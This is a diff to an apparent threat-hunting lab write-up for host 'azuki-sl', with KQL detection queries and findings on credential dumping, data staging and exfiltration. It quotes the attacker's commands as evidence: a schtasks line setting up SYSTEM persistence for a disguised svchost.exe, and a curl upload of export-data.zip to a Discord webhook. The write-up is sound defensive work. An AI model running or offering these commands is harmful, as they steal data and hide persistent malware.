@@ -278,8 +278,10 @@ Results: Timestamp 2025-11-19T19:07:46.9796512Z: “Windows Update Check” was 
 <img width="1178" height="737" alt="image" src="https://github.com/user-attachments/assets/5c37f092-92e2-4003-9b72-3568ccc94deb" />
 The path to an executable is included in the scheduled task:
 
-"schtasks.exe" /create /tn "Windows Update Check" /tr **C:\ProgramData\WindowsCache\svchost.exe** /sc daily /st 02:00 /ru SYSTEM /f
-**Query 8 - Credential Dumping:
+"schtasks.exe" /create /tn "Windows Update Check" /tr **C:\ProgramData\WindowsCache\svchost.exe** /sc daily /st 02:00 /ru SYSTEM /f"
+
+**Query 8 - Credential Dumping:**
+
 ```sql
 // Detect potential credential dumping tool filenames
 DeviceProcessEvents
@@ -319,6 +321,7 @@ DeviceProcessEvents
 
  ```
 **Results:** Timeline 2025-11-19T19:08:26.2804285Z: File “mm.exe” was created on the “azuki-sl” device.
+
 <img width="1122" height="643" alt="image" src="https://github.com/user-attachments/assets/4404e563-2a1f-4e54-9399-6475762c5420" />
 
 **Query 9 - Data Collection:**
@@ -330,12 +333,15 @@ DeviceFileEvents
 | where FileName contains "zip"
 | order by Timestamp desc
 ```
+
 **Results:** Timestamp **2025-11-19T17:19:19.2066001Z**: “export-data ” file was created.
 
 Timestamp **2025-11-19T19:08:58.0244963Z**: another  “export-data ” file was created.
+
 <img width="1092" height="667" alt="image" src="https://github.com/user-attachments/assets/a6137b03-28e1-4456-980b-f7d8e0f82563" />
 
 **Query 10 - Exfiltration via Discord Webhook**
+
 ```sql
 DeviceNetworkEvents
 | where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
@@ -349,9 +355,11 @@ DeviceNetworkEvents
 **Results:**
 
 Timeline **2025-11-19T19:09:21.4234133Z**: “export-data” file ws uploaded using discord service using the following command:
+
 ```sql
 "curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8
 ```
+
 **Query 11 - Lateral Movement Attempt:**
 ```sql
 DeviceNetworkEvents
